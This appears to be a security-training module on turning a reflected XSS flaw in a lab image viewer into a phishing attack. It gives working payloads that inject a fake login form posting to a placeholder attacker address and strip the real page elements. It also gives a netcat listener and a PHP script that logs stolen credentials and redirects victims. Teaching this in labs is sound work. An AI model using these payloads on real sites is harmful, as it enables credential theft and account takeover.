# Phishing

Another very common type of XSS attack is a phishing attack. Phishing attacks usually utilize legitimate-looking information to trick victims into sending their sensitive information to the attacker. A common form of XSS phishing attacks is through injecting fake login forms that send login details to the attacker's server, which may then be used to log in on behalf of the victim and gain control over their account and sensitive information.

Furthermore, if we identify an XSS vulnerability in a web application belonging to a particular organization, we can use such an attack as a phishing simulation exercise. This can help evaluate the security awareness of the organization's employees, especially if they trust the vulnerable web application and do not expect it to harm them.

---

# XSS Discovery

We begin by identifying the XSS vulnerability in the web application located at:

```text
/phishing/index.php
```

The application is a simple image viewer where users provide an image URL, and the application displays the image.

Example:

```text
http://SERVER_IP/phishing/index.php?url=https://www.hackthebox.eu/images/logo-htb.svg
```

Since we control the URL parameter, we can begin testing for XSS using a basic payload:

```html
<script>alert(window.origin)</script>
```

Example:

```text
http://SERVER_IP/phishing/index.php?url=<script>alert(window.origin)</script>
```

If the payload does not execute, additional XSS discovery techniques must be used to identify a working payload.

**Tip:** Inspect how your input is reflected in the page source to determine which payload format will work.

---

# Login Form Injection

After identifying a working XSS payload, the next step is injecting a fake login form.

Example login form:

```html
<h3>Please login to continue</h3>
<form action=http://OUR_IP>
    <input type="username" name="username" placeholder="Username">
    <input type="password" name="password" placeholder="Password">
    <input type="submit" name="submit" value="Login">
</form>
```

The form submits credentials to a server controlled by the attacker.

Displayed form:

```html
<div>
<h3>Please login to continue</h3>
<input type="text" placeholder="Username">
<input type="text" placeholder="Password">
<input type="submit" value="Login">
<br><br>
</div>
```

---

# Writing HTML to the Page

To inject HTML into the vulnerable page, JavaScript can be used:

```javascript
document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');
```

This code can be embedded inside the working XSS payload.

Because this is a Reflected XSS vulnerability, the malicious URL can be shared with victims. When they visit the URL, the injected login form will appear.

---

# Cleaning Up

The original Image URL input field is still visible, making the page look suspicious.

Inspecting the source reveals:

```html
<form role="form" action="index.php" method="GET" id='urlform'>
    <input type="text" placeholder="Image URL" name="url">
</form>
```

The element can be removed using:

```javascript
document.getElementById('urlform').remove();
```

Updated payload:

```javascript
document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');
document.getElementById('urlform').remove();
```

After execution, the original URL form disappears and only the injected login form remains.

---

# Removing Remaining HTML

Sometimes part of the original HTML remains visible.

This can be hidden by adding an HTML comment after the payload:

```html
<!--
```

Example:

```html
...PAYLOAD... <!--
```

This comments out any remaining unwanted HTML and makes the phishing page appear more legitimate.

# Credential Stealing

The fake login form submits credentials to the attacker's server.

If the attacker is not listening for connections, the victim will receive an error:

```text
This site can't be reached
```

To observe incoming credentials, a listener can be started:

```bash
sudo nc -lvnp 80
```

Example output:

```http
GET /?username=test&password=test&submit=Login HTTP/1.1
Host: 10.10.XX.XX
```

Credentials are visible directly in the request:

```text
username=test
password=test
```

Any victim submitting credentials through the form will send them to the attacker.

---

# Using a PHP Server

A simple netcat listener causes browser errors that may alert the victim.

Instead, a lightweight PHP application can:

1. Receive credentials
2. Store them
3. Redirect the victim back to the original website

Example PHP script:

```php
<?php
if (isset($_GET['username']) && isset($_GET['password'])) {
    $file = fopen("creds.txt", "a+");
    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
    header("Location: http://SERVER_IP/phishing/index.php");
    fclose($file);
    exit();
}
?>
```

---

# Starting the PHP Server

```bash
mkdir /tmp/tmpserver
cd /tmp/tmpserver
vi index.php
sudo php -S 0.0.0.0:80
```

Output:

```text
PHP 7.4.15 Development Server (http://0.0.0.0:80) started
```

---

# Verifying Credential Capture

After a victim submits credentials, they are stored in:

```text
creds.txt
```

Example:

```text
Username: test | Password: test
```

The victim is then redirected back to the original page, making the attack less suspicious.

---

# Attack Flow

```text
1. Identify XSS vulnerability
2. Find working payload
3. Inject fake login form
4. Remove legitimate page elements
5. Clean up page appearance
6. Host credential collection server
7. Send malicious URL to victim
8. Victim enters credentials
9. Credentials captured
10. Victim redirected back to legitimate page
```

---

# Key Takeaways

- XSS can be leveraged for phishing attacks.
- Fake login forms can be injected into trusted websites.
- Victims are more likely to trust login prompts inside legitimate applications.
- Reflected XSS attacks are commonly delivered through crafted URLs.
- Credential collection can be automated using a simple web server.
- Redirecting victims back to the original application reduces suspicion.
